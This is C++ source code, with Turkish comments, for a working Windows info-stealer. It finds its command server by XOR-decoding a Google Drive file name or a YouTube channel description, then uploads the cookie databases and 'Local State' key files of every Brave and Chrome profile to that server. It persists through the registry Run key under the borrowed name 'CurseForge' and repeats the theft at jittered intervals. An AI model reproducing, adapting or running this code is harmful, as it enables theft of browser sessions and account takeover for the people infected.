#include <windows.h>
#include <shlobj.h>
#include <winhttp.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>
#include <stdexcept>
#include <cctype>
#include <regex>
#include <chrono>
#include <thread>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "advapi32.lib")

namespace fs = std::filesystem;

// youtube desc /////////////////////////////////////////////////////////////////////
static std::wstring ToLower(std::wstring s)
{
    std::transform(
        s.begin(),
        s.end(),
        s.begin(),
        [](wchar_t c) {
            return static_cast<wchar_t>(towlower(c));
        }
    );

    return s;
}
static std::string WStringToUTF8(const std::wstring& input)
{
    if (input.empty())
        return {};

    int size = WideCharToMultiByte(
        CP_UTF8,
        0,
        input.data(),
        static_cast<int>(input.size()),
        nullptr,
        0,
        nullptr,
        nullptr
    );

    std::string result(size, '\0');

    WideCharToMultiByte(
        CP_UTF8,
        0,
        input.data(),
        static_cast<int>(input.size()),
        result.data(),
        size,
        nullptr,
        nullptr
    );

    return result;
}
static std::wstring UTF8ToWString(const std::string& input)
{
    if (input.empty())
        return {};

    int size = MultiByteToWideChar(
        CP_UTF8,
        MB_ERR_INVALID_CHARS,
        input.data(),
        static_cast<int>(input.size()),
        nullptr,
        0
    );

    if (size <= 0)
        return {};

    std::wstring result(size, L'\0');

    MultiByteToWideChar(
        CP_UTF8,
        MB_ERR_INVALID_CHARS,
        input.data(),
        static_cast<int>(input.size()),
        result.data(),
        size
    );

    return result;
}
static std::wstring HTMLDecode(std::wstring text)
{
    // YouTube description içinde sık görülen HTML entity'leri.
    size_t pos;

    while ((pos = text.find(L"&quot;")) != std::wstring::npos)
        text.replace(pos, 6, L"\"");

    while ((pos = text.find(L"&#39;")) != std::wstring::npos)
        text.replace(pos, 5, L"'");

    while ((pos = text.find(L"&amp;")) != std::wstring::npos)
        text.replace(pos, 5, L"&");

    while ((pos = text.find(L"&lt;")) != std::wstring::npos)
        text.replace(pos, 4, L"<");

    while ((pos = text.find(L"&gt;")) != std::wstring::npos)
        text.replace(pos, 4, L">");

    return text;
}
std::string GetYouTubeChannelDescription(const std::string& channelUrl)
{
    std::wstring url = UTF8ToWString(channelUrl);

    if (url.empty())
        return {};

    // URL parçalarını WinHTTP ile ayır.
    URL_COMPONENTS components{};
    components.dwStructSize = sizeof(components);

    wchar_t host[512]{};
    wchar_t path[4096]{};

    components.lpszHostName = host;
    components.dwHostNameLength = ARRAYSIZE(host);

    components.lpszUrlPath = path;
    components.dwUrlPathLength = ARRAYSIZE(path);

    if (!WinHttpCrackUrl(
            url.c_str(),
            0,
            0,
            &components))
    {
        return {};
    }

    bool isHttps = (components.nScheme == INTERNET_SCHEME_HTTPS);

    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession)
        return {};

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        host,
        components.nPort,
        0
    );

    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);
        return {};
    }

    DWORD flags = isHttps ? WINHTTP_FLAG_SECURE : 0;

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        path,
        nullptr,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags
    );

    if (!hRequest)
    {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return {};
    }

    // YouTube için normal bir browser User-Agent kullan.
    LPCWSTR headers =
        L"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        L"Accept-Language: en-US,en;q=0.9\r\n"
        L"Cache-Control: no-cache\r\n";

    WinHttpAddRequestHeaders(
        hRequest,
        headers,
        -1L,
        WINHTTP_ADDREQ_FLAG_ADD
    );

    BOOL sent = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0
    );

    if (!sent)
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return {};
    }

    if (!WinHttpReceiveResponse(hRequest, nullptr))
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return {};
    }

    // HTTP status kodunu kontrol et.
    DWORD statusCode = 0;
    DWORD statusSize = sizeof(statusCode);

    WinHttpQueryHeaders(
        hRequest,
        WINHTTP_QUERY_STATUS_CODE |
        WINHTTP_QUERY_FLAG_NUMBER,
        nullptr,
        &statusCode,
        &statusSize,
        nullptr
    );

    if (statusCode < 200 || statusCode >= 300)
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return {};
    }

    // Response body oku.
    std::string html;

    while (true)
    {
        DWORD available = 0;

        if (!WinHttpQueryDataAvailable(
                hRequest,
                &available))
        {
            break;
        }

        if (available == 0)
            break;

        std::vector<char> buffer(available);

        DWORD read = 0;

        if (!WinHttpReadData(
                hRequest,
                buffer.data(),
                available,
                &read))
        {
            break;
        }

        html.append(buffer.data(), read);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    if (html.empty())
        return {};

    // HTML UTF-8 kabul ediliyor.
    std::wstring htmlW = UTF8ToWString(html);

    if (htmlW.empty())
        return {};

    /*
        Öncelik:
        1. <meta property="og:description" content="...">
        2. <meta name="description" content="...">
    */

    std::wregex ogRegex(
        LR"(<meta[^>]+property\s*=\s*["']og:description["'][^>]+content\s*=\s*["']([^"']*)["'][^>]*>)",
        std::regex_constants::icase
    );

    std::wsmatch match;

    if (std::regex_search(htmlW, match, ogRegex))
    {
        std::wstring description = match[1].str();

        description = HTMLDecode(description);

        return WStringToUTF8(description);
    }

    std::wregex descRegex(
        LR"(<meta[^>]+name\s*=\s*["']description["'][^>]+content\s*=\s*["']([^"']*)["'][^>]*>)",
        std::regex_constants::icase
    );

    if (std::regex_search(htmlW, match, descRegex))
    {
        std::wstring description = match[1].str();

        description = HTMLDecode(description);

        return WStringToUTF8(description);
    }

    return {};
}
/////////////////////////////////////////////////////////////////////////////////////

// drive file name //////////////////////////////////////////////////////////////////
std::string GetDriveFileName(const std::string& driveUrl)
{
    // UTF-8 -> UTF-16
    int wlen = MultiByteToWideChar(
        CP_UTF8, 0,
        driveUrl.c_str(), -1,
        nullptr, 0
    );

    std::wstring url(wlen - 1, L'\0');

    MultiByteToWideChar(
        CP_UTF8, 0,
        driveUrl.c_str(), -1,
        url.data(), wlen
    );

    URL_COMPONENTS uc{};
    uc.dwStructSize = sizeof(uc);

    wchar_t host[256]{};
    wchar_t path[2048]{};

    uc.lpszHostName = host;
    uc.dwHostNameLength = _countof(host);

    uc.lpszUrlPath = path;
    uc.dwUrlPathLength = _countof(path);

    if (!WinHttpCrackUrl(url.c_str(), 0, 0, &uc))
        return {};

    HINTERNET session = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!session)
        return {};

    HINTERNET connect = WinHttpConnect(
        session,
        uc.lpszHostName,
        uc.nPort,
        0
    );

    if (!connect)
    {
        WinHttpCloseHandle(session);
        return {};
    }

    DWORD flags =
        (uc.nScheme == INTERNET_SCHEME_HTTPS)
        ? WINHTTP_FLAG_SECURE
        : 0;

    HINTERNET request = WinHttpOpenRequest(
        connect,
        L"GET",
        uc.lpszUrlPath,
        nullptr,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags
    );

    if (!request ||
        !WinHttpSendRequest(
            request,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            WINHTTP_NO_REQUEST_DATA,
            0,
            0,
            0
        ) ||
        !WinHttpReceiveResponse(request, nullptr))
    {
        if (request)
            WinHttpCloseHandle(request);

        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);

        return {};
    }

    std::string filename;

    // Content-Disposition
    DWORD size = 0;

    WinHttpQueryHeaders(
        request,
        WINHTTP_QUERY_CONTENT_DISPOSITION,
        WINHTTP_HEADER_NAME_BY_INDEX,
        nullptr,
        &size,
        WINHTTP_NO_HEADER_INDEX
    );

    if (size)
    {
        std::wstring header(
            size / sizeof(wchar_t),
            L'\0'
        );

        if (WinHttpQueryHeaders(
            request,
            WINHTTP_QUERY_CONTENT_DISPOSITION,
            WINHTTP_HEADER_NAME_BY_INDEX,
            header.data(),
            &size,
            WINHTTP_NO_HEADER_INDEX))
        {
            std::wregex re(
                LR"(filename\*?=(?:UTF-8''|"?)([^";\r\n]+))",
                std::regex_constants::icase
            );

            std::wsmatch match;

            if (std::regex_search(header, match, re))
            {
                std::wstring wfilename = match[1].str();

                int len = WideCharToMultiByte(
                    CP_UTF8,
                    0,
                    wfilename.c_str(),
                    -1,
                    nullptr,
                    0,
                    nullptr,
                    nullptr
                );

                if (len > 0)
                {
                    std::string utf8(len - 1, '\0');

                    WideCharToMultiByte(
                        CP_UTF8,
                        0,
                        wfilename.c_str(),
                        -1,
                        utf8.data(),
                        len,
                        nullptr,
                        nullptr
                    );

                    filename = utf8;
                }
            }
        }
    }

    // Fallback: HTML title
    if (filename.empty())
    {
        std::string body;
        char buffer[4096];
        DWORD read = 0;

        while (
            WinHttpReadData(
                request,
                buffer,
                sizeof(buffer),
                &read
            ) &&
            read)
        {
            body.append(buffer, read);
        }

        std::smatch match;

        std::regex title(
            R"(<title[^>]*>(.*?)</title>)",
            std::regex_constants::icase
        );

        if (std::regex_search(body, match, title))
        {
            filename = match[1].str();

            const std::string suffix =
                " - Google Drive";

            if (filename.size() > suffix.size() &&
                filename.compare(
                    filename.size() - suffix.size(),
                    suffix.size(),
                    suffix
                ) == 0)
            {
                filename.erase(
                    filename.size() - suffix.size()
                );
            }
        }
    }

    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);

    return filename;
}
/////////////////////////////////////////////////////////////////////////////////////

// xor dec //////////////////////////////////////////////////////////////////////////
std::string xorDecrypt(const std::string& enc, const std::string& key)
{
    if (key.empty())
        return "";

    if (enc.length() % 2 != 0)
        return "";

    auto hexValue = [](char c) -> unsigned char {
        if (c >= '0' && c <= '9')
            return c - '0';
        if (c >= 'a' && c <= 'f')
            return c - 'a' + 10;
        if (c >= 'A' && c <= 'F')
            return c - 'A' + 10;

        return -1;
    };

    // HEX -> raw bytes
    std::string data;
    data.reserve(enc.length() / 2);

    for (size_t i = 0; i < enc.length(); i += 2)
    {
        unsigned char byte =
            (hexValue(enc[i]) << 4) |
             hexValue(enc[i + 1]);

        data.push_back(static_cast<char>(byte));
    }

    // XOR with key
    for (size_t i = 0; i < data.size(); ++i)
    {
        data[i] ^= key[i % key.size()];
    }

    return data;
}
/////////////////////////////////////////////////////////////////////////////////////

bool UploadFile(HINTERNET connection, const fs::path& filePath, const std::string& fileNameHeader)
{
    // Dosyayı aç
    std::ifstream file(filePath, std::ios::binary);

    if (!file.is_open())
    {
        std::cerr << "[UPLOAD ERROR] Dosya acilamadi: "
                  << filePath.string() << "\n";
        return false;
    }

    // Dosya boyutunu al
    file.seekg(0, std::ios::end);
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    if (size <= 0)
    {
        std::cerr << "[UPLOAD ERROR] Dosya bos veya boyutu okunamadi: "
                  << filePath.string() << "\n";
        file.close();
        return false;
    }

    // Dosyayi belleğe oku
    std::vector<char> data(static_cast<size_t>(size));

    if (!file.read(data.data(), size))
    {
        std::cerr << "[UPLOAD ERROR] Dosya okunamadi: "
                  << filePath.string() << "\n";
        file.close();
        return false;
    }

    file.close();

    // HTTP request oluştur
    HINTERNET request = WinHttpOpenRequest(
        connection,
        L"POST",
        L"/archive-32",
        nullptr,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );

    if (!request)
    {
        DWORD error = GetLastError();

        std::cerr << "[UPLOAD ERROR] WinHttpOpenRequest basarisiz. "
                  << "GetLastError=" << error << "\n";

        return false;
    }

    // Header'lar
    std::wstring wHeader =
        L"Content-Type: application/octet-stream\r\n"
        L"X-File-Name: " +
        std::wstring(fileNameHeader.begin(), fileNameHeader.end()) +
        L"\r\n";

    // İsteği gönder
    BOOL result = WinHttpSendRequest(
        request,
        wHeader.c_str(),
        static_cast<DWORD>(-1),
        data.data(),
        static_cast<DWORD>(data.size()),
        static_cast<DWORD>(data.size()),
        0
    );

    if (!result)
    {
        DWORD error = GetLastError();

        std::cerr << "[UPLOAD ERROR] WinHttpSendRequest basarisiz. "
                  << "GetLastError=" << error << "\n";

        WinHttpCloseHandle(request);
        return false;
    }

    // Sunucudan cevap al
    result = WinHttpReceiveResponse(request, nullptr);

    if (!result)
    {
        DWORD error = GetLastError();

        std::cerr << "[UPLOAD ERROR] WinHttpReceiveResponse basarisiz. "
                  << "GetLastError=" << error << "\n";

        WinHttpCloseHandle(request);
        return false;
    }

    // HTTP status kodunu oku
    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);

    if (!WinHttpQueryHeaders(
            request,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX,
            &statusCode,
            &statusCodeSize,
            WINHTTP_NO_HEADER_INDEX))
    {
        DWORD error = GetLastError();

        std::cerr << "[UPLOAD ERROR] HTTP status code okunamadi. "
                  << "GetLastError=" << error << "\n";

        WinHttpCloseHandle(request);
        return false;
    }

    if (statusCode < 200 || statusCode >= 300)
    {
        std::cerr << "[UPLOAD ERROR] Sunucu dosyayi kabul etmedi. "
                  << "HTTP Status=" << statusCode << "\n";

        WinHttpCloseHandle(request);
        return false;
    }

    std::cout << "[UPLOAD OK] Dosya basariyla gonderildi. "
              << "HTTP Status=" << statusCode << "\n";

    WinHttpCloseHandle(request);
    return true;
}

void ProcessFile(HINTERNET connection, const fs::path& filePath, const std::string& profileName, const std::string& fileType)
{
    // Dosya var mı ve okunabiliyor mu kontrol et
    if (fs::exists(filePath) && fs::is_regular_file(filePath))
    {
        std::string serverFileName = profileName + "_" + fileType;
        if (UploadFile(connection, filePath, serverFileName))
        {
            std::cout << profileName << " " << fileType << " yuklendi.\n";
        }
        else
        {
            std::cout << profileName << " " << fileType << " upload unsuccess.\n";
        }
    }
    else
    {
        std::cout << profileName << " " << fileType << " erisilemedi.\n";
    }
}

int libc_main(){
    // get c2
    std::wstring wserver;
    //const char dr_url[] = "\x68\164\x74\160\163\072\057\057\x64\162\151\166\x65\x2e\147\157\157\147\154\145\056\x63\157\155\057\146\151\154\x65\057\x64\x2f\061\123\x5a\112\157\x59\x34\171\156\064\x51\x4c\151\137\071\x2d\067\131\060\102\060\123\x36\x2d\167\155\071\167\x45\x37\x56\x68\057\166\151\x65\167";
    std::string dr_filename = GetDriveFileName("https://drive.google.com/file/d/1SZJoY4yn4QLi_9o7-Y7B0S6-wm9wE7Vh/view");

    // test
    //std::cout << dr_filename << "dr_filename";


    if (dr_filename.empty()){
        //const char yt_url[] = "\x68\164\x74\160\163\072\057\057\x77\167\167\x2e\171\157\165\164\165\142\x65\x2e\x63\157\155\057\x40\x6f\147\x2e\x63\141\162\154\152\157\150\156\163\157\156";
        std::string yt_description = GetYouTubeChannelDescription("https://www.youtube.com/@og.carljohnson");
        std::string server_from_yt = xorDecrypt(yt_description, "cj");
        std::wstring wserver_yt(server_from_yt.begin(), server_from_yt.end());
        wserver = wserver_yt;
    } else {
        std::string server_from_dr = xorDecrypt(dr_filename, "cj");
        std::wstring wserver_dr(server_from_dr.begin(), server_from_dr.end());
        wserver = wserver_dr;
        
        // test
        //std::cout << server_from_dr << "server_from_dr";
    }

    // WinHTTP session
    HINTERNET session = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!session){std::cerr << "WinHttpOpen basarisiz.\n";return 1;}
    
    // connect to c2
    HINTERNET connection = WinHttpConnect(
        session,
        //L"mirror-us.intel-thermal.workers.dev",
        //L"127.0.0.1",
        wserver.c_str(),
        INTERNET_DEFAULT_HTTPS_PORT,
        0
    );

    if (!connection){std::cerr << "WinHttpConnect basarisiz.\n";WinHttpCloseHandle(session);return 1;}

    // gather cookies

    PWSTR localAppData = nullptr;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &localAppData);

    if (FAILED(hr)){std::cerr << "LocalAppData yolu alinamadi.\n";return 1;}

    // C:\Users\user\AppData\Local\BraveSoftware\Brave-Browser\User Data
    fs::path br_userDataPath = fs::path(localAppData) / L"BraveSoftware" / L"Brave-Browser" / L"User Data";
    if (!fs::exists(br_userDataPath)){std::cerr << "Brave User Data klasoru bulunamadi.\n";return 1;}

    fs::path ch_userDataPath = fs::path(localAppData) / L"Google" / L"Chrome" / L"User Data";
    CoTaskMemFree(localAppData);
    if (!fs::exists(ch_userDataPath)){std::cerr << "Chrome User Data klasoru bulunamadi.\n";return 1;}

    // br local state
    ProcessFile(connection, br_userDataPath / "Local State", "User Data", "Local State");
    // ch local state
    ProcessFile(connection, ch_userDataPath / "Local State", "User Data", "Local State");

    // br profiles
    for (const auto& entry : fs::directory_iterator(br_userDataPath))
    {
        if (entry.is_directory())
        {
            std::string dirName = entry.path().filename().string();

            // Sadece Default veya "Profile " ile başlayan klasörleri hedefle
            if (dirName == "Default" || dirName.find("Profile") == 0)
            {
                // Cookies yolu (Network/Cookies veya doğrudan Cookies)
                fs::path cookiesPath = entry.path() / "Network" / "Cookies";
                if (!fs::exists(cookiesPath))
                {
                    cookiesPath = entry.path() / "Cookies";
                }
                ProcessFile(connection, cookiesPath, dirName, "Cookies");

                // Profil içi Local State (varsa)
                fs::path profileLocalState = entry.path() / "Local State";
                ProcessFile(connection, profileLocalState, dirName, "Local State");
            }
        }
    }

    // ch profiles
    for (const auto& entry : fs::directory_iterator(ch_userDataPath))
    {
        if (entry.is_directory())
        {
            std::string dirName = entry.path().filename().string();

            if (dirName == "Default" || dirName.find("Profile") == 0)
            {
                fs::path cookiesPath = entry.path() / "Network" / "Cookies";
                if (!fs::exists(cookiesPath))
                {
                    cookiesPath = entry.path() / "Cookies";
                }
                ProcessFile(connection, cookiesPath, dirName, "Cookies");

                fs::path profileLocalState = entry.path() / "Local State";
                ProcessFile(connection, profileLocalState, dirName, "Local State");
            }
        }
    }


    // conn close
    WinHttpCloseHandle(connection);
    WinHttpCloseHandle(session);

    return 0;
}

bool AddToStartup(const std::wstring& name, const std::wstring& exePath) { HKEY hKey{}; if (RegOpenKeyExW( HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) return false; const LONG result = RegSetValueExW( hKey, name.c_str(), 0, REG_SZ, reinterpret_cast<const BYTE*>(exePath.c_str()), static_cast<DWORD>((exePath.size() + 1) * sizeof(wchar_t))); RegCloseKey(hKey); return result == ERROR_SUCCESS; }

int main()
{

    std::this_thread::sleep_for(std::chrono::minutes(1));

    wchar_t path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    AddToStartup(L"CurseForge", path);

    std::this_thread::sleep_for(std::chrono::seconds(27));
    libc_main();

    const int delays[] = {27, 34, 31, 37, 26, 30};
    int i = 0;
    while (1337)
    {
        std::this_thread::sleep_for(std::chrono::minutes(delays[i]));
        i = (i + 1) % 6;
        libc_main();
    }

    return 0;
}
